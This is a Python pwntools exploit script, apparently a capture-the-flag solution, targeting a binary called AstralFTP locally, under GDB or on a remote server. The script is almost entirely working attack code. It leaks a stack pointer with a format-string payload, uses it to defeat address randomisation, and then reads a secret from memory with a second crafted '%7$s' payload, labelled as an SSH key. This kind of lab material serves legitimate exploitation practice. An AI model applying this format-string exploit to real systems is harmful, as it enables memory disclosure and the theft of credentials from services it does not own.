import re
from pwn import *
import warnings
warnings.filterwarnings('ignore') 


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './AstralFTP'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


io = start()

io.sendlineafter(b'> ', '3'.encode())
io.sendlineafter(b': ', '%43$p'.encode()) # Got 43 from fuzz.py
result = io.recvuntil(b'> ')
t = result.decode("ascii").strip()

match = re.search('0x([0-9a-f]{12})', t)
address = int(match.group(1), 16)
log.info("runtime _start offset: " + hex(address)) # runtime _start offset

_start_offset = 0x001011a0
flag = 0x00104040

base_address = address - _start_offset
print("Base offset: ", hex(base_address)) # _base offset

flag_address = base_address + flag
print("Flag offset: ", hex(flag_address))

byte_array = bytearray(b'%7$s    ')

# Convert our address to bytes in reverse order
address_bytes = flag_address.to_bytes(8, 'little')
# print(binascii.hexlify(address_bytes))

# Add address and end line to our payload
byte_array += bytearray(address_bytes)
byte_array += bytearray(b'\n')
# print(binascii.hexlify(byte_array))

io.send(b'3\n')
io.recvuntil(b': ')
io.send_raw(byte_array)

ssh_key = io.recvuntil(b'\n ').decode()
print(ssh_key)
# io.interactive()
